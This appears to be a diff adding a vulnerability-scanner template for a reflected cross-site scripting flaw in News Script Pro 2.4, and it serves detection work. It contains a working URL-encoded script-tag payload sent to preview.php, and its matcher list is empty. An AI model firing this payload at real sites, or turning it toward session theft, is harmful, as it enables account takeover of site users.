@@ -1,0 +1,15 @@
+id: news-script-xss
+brief:
+    title: News Script Pro 2.4 - Cross-Site Scripting
+    by: r3Y3r53
+    level: medium
+    about: The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credenti...
+    label:
+        - newsscript
+        - xss
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/preview.php/mn71q%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3Ep15vr?cat_id=&p=2'
+      signs: []
